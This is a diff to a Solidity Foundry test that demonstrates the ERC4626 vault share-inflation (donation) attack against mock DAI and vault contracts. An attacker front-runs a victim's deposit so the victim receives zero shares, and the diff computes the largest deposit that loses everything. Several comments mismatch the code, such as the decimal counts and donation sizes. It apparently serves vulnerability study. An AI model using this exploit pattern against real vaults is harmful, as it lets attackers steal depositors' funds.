@@ -17,30 +17,73 @@ contract ERC4626Attack is Test {
     function setUp() public {
         mockDai = new MockDai("MockDai", "MDAI");
         vault = new Vault(mockDai, "Vault", "VLT");
-        // Fund Alice and Bob with 10000 DAI
-        mockDai.transfer(alice, 10_000_000 ether);
-        mockDai.transfer(bob, 10_000_000 ether);
+        // Fund Alice and Bob with 1000_000_000 DAI
+        mockDai.transfer(alice, 1000_000_000 ether);
+        mockDai.transfer(bob, 1000_000_000 ether);
         // Approvals by bob and alice on Vault contract
         vm.prank(alice);
-        mockDai.approve(address(vault), 10_000_000 ether);
+        mockDai.approve(address(vault), 1000_000_000 ether);
         vm.prank(bob);
-        mockDai.approve(address(vault), 10_000_000 ether);
+        mockDai.approve(address(vault), 1000_000_000 ether);
     }
 
-    function testAttack() public {
-        // 1. Bob deposits 1000 DAI and get issued 1000 shares of Vault tokens
+    // For the case of DAI, the decimals is 18
+    function testAttackForDAI() public {
+        // 1. Bob deposits 1000 DAI and gets issued 1000 shares of Vault tokens
         // 2. Alice tries depositing 100 DAI and should get issued 100 shares of Vault tokens
         // 3. Before Alice could deposit, Bob donates 1000_000 DAI to the Vault to reduce the share price resulting in Alice getting 0 shares
         vm.startPrank(bob);
         vault.deposit(1000 ether, bob); // Deposit of $1000 DAI by Bob
-        mockDai.transfer(address(vault), 1000_000 ether);
+        mockDai.transfer(address(vault), 100_000_000 ether);
         vm.stopPrank();
         vm.prank(alice);
-        vault.deposit(100 ether, alice); // Alice was supposed to get 100 shares but will now receive 100*1000/1000_000
-        uint256 noOfSharesReceivedInitially = vault.balanceOf(bob); // CORRECT THIS
+        vault.deposit(100_000, alice); // Max amount that Alice can deposit that will end up her losing all her shares
+        uint256 noOfSharesReceived = vault.balanceOf(bob);
         vm.prank(bob);
-        vault.redeem(noOfSharesReceivedInitially, bob, bob); // Bob redeems all his shares
-        assertEq(vault.balanceOf(alice), 0); // Alice should get 0 shares but getting 99900099900099900 shares (< 10 ** 18, but should be 0 ideally)
-        // assertGt(mockDai.balanceOf(bob), 1001_000 ether); // Bob gets more than his initial assets deposited
+        vault.redeem(noOfSharesReceived, bob, bob); // Bob redeems all his shares
+        assertEq(vault.balanceOf(alice), 0);
+        assertGt(mockDai.balanceOf(bob), 100_001_000 ether); // Bob gets more than his initial assets deposited
     }
+
+    function testMaxDAIDepositForAlice() public {
+        vm.startPrank(bob);
+        vault.deposit(1000 ether, bob); // Deposit of $1000 DAI by Bob
+        mockDai.transfer(address(vault), 100_000_000 ether);
+        vm.stopPrank();
+        vm.prank(alice);
+        console.log("testMaxDAIDepositForAlice: ", vault.previewDeposit(.0000000000001 ether)); // If Alice deposits max 100_000 wei of DAI is when her shares will be 0
+        assertEq(vault.previewDeposit(.0000000000001 ether), 0);
+    }
+
+    // // For the case of USDC, the decimals is 18
+    // function testAttackForUSDC() public {
+    //     // 1. Bob deposits 1000 USDC and gets issued 1000 shares of Vault tokens
+    //     // 2. Alice tries depositing 100 USDC and should get issued 100 shares of Vault tokens
+    //     // 3. Before Alice could deposit, Bob donates 1000_000 USDC to the Vault to reduce the share price resulting in Alice getting 0 shares
+    //     vm.startPrank(bob);
+    //     vault.deposit(100_000_000, bob); // Deposit of $100 USDC by Bob
+    //     mockDai.transfer(address(vault), 10_000_000_000_000_000); // Bob would need to transfer 10B USDC to the Vault to reduce the share price
+    //     vm.stopPrank();
+    //     vm.prank(alice);
+    //     vault.deposit(100_000_000, alice); // Max amount that Alice can deposit that will end up her losing all her shares (100 USDC)
+    //     uint256 noOfSharesReceived = vault.balanceOf(bob); 
+    //     vm.prank(bob);
+    //     vault.redeem(noOfSharesReceived, bob, bob); // Bob redeems all his shares
+    //     assertEq(vault.balanceOf(alice), 0);
+    //     assertGt(mockDai.balanceOf(bob), 10_000_000_100_000_000); // Bob gets more than his initial assets deposited
+    // }
+
+    // // For the case of USDC, the decimals is 6
+    // function testMaxUSDCDepositForAlice() public {
+    //     // 1. Bob deposits 100 USDC and gets issued 100 shares of Vault tokens
+    //     // 2. Alice tries depositing 100 USDC and should get issued 100 shares of Vault tokens
+    //     // 3. Before Alice could deposit, Bob donates 1000_000_000 USDC to the Vault to reduce the share price resulting in Alice getting 0 shares
+    //     vm.startPrank(bob);
+    //     vault.deposit(100_000_000, bob); // Deposit of $100 USDC by Bob
+    //     mockDai.transfer(address(vault), 10_000_000_000_000_000); // Bob would need to transfer 10B USDC to the Vault to reduce the share price
+    //     vm.stopPrank();
+    //     vm.prank(alice);
+    //     console.log("testMaxUSDCDepositForAlice: ", vault.previewDeposit(100_000_000)); // If Alice deposits max this much amount is when her shares will be 0
+    //     assertEq(vault.previewDeposit(100_000_000), 0);
+    // }
 }
